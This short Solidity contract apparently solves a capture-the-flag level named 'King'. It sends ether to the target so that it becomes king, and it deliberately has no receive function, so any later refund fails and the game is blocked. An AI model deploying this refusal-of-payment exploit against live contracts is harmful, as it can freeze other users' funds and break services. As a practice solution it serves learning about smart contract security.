// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./King.sol";

contract Solve {
    constructor() payable {}

    function attack(address payable _address) public {
        King king = King(_address);
        address(king).call{value: 0.1 ether}("");
    }

    // receive() X
}